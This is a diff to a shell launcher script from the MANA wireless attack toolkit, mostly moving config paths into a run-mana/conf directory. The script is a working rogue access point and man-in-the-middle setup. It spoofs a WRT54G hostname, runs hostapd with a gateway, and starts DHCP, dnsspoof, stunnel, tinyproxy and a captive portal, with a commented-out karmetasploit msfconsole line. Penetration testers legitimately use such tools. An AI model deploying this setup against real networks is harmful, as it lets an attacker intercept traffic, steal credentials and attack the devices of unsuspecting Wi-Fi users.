@@ -3,11 +3,12 @@ etc=/etc/mana-toolkit
 lib=/usr/lib/mana-toolkit
 loot=/var/lib/mana-toolkit
 share=/usr/share/mana-toolkit
-set -x
+
 phy=wlan0
-conf=$etc/hostapd-mana.conf
+conf=$share/run-mana/conf/hostapd-mana.conf
 hostapd=$lib/hostapd
 set -x
+
 hostname WRT54G
 echo hostname WRT54G
 sleep 2
@@ -20,13 +21,13 @@ rfkill unblock wlan
 #ifconfig $phy up
 
 sed -i "s/^interface=.*$/interface=$phy/" $conf
-sed -i "s/^set INTERFACE .*$/set INTERFACE $phy/" $etc/karmetasploit.rc
+sed -i "s/^set INTERFACE .*$/set INTERFACE $phy/" $share/run-mana/conf/karmetasploit.rc
 #$hostapd $conf&
 
-#  $nodogsplash -f -c /etc/nodogsplash/nodogsplash.conf &
+#  $nodogsplash -f -c $share/run-mana/conf/nodogsplash.conf &
   sleep 9
 #echo "Starting hostapd"
-hostapd /etc/hostapd/hostapd.conf&
+hostapd $share/run-mana/conf/hostapd.conf&
 # ./$0 --start_hostapd && #Hostapd - Start modified hostapd that implements new mana attacks
   sleep 5
 
@@ -34,12 +35,12 @@ sleep 5
 ifconfig $phy 10.0.0.1 netmask 255.255.255.0
 route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
 
-dnsmasq -z -C $etc/dnsmasq-dhcpd.conf -i $phy -I lo
-dnsspoof -i $phy -f $etc/dnsspoof.conf&
+dnsmasq -z -C $share/run-mana/conf/dnsmasq-dhcpd.conf -i $phy -I lo
+dnsspoof -i $phy -f $share/run-mana/conf/dnsspoof.conf&
 service apache2 start
-stunnel4 $etc/stunnel.conf
-tinyproxy -c $etc/tinyproxy.conf&
-#msfconsole -r $etc/karmetasploit.rc& #Remove "&" to fix msfconsole exiting 
+stunnel4 $share/run-mana/conf/stunnel.conf
+tinyproxy -c $share/run-mana/conf/tinyproxy.conf&
+#msfconsole -r $share/run-mana/conf/karmetasploit.rc& #Remove "&" to fix msfconsole exiting 
 echo "Starting nodogsplash"
 nodogsplash -f -c /etc/nodogsplash/nodogsplash.conf &
 
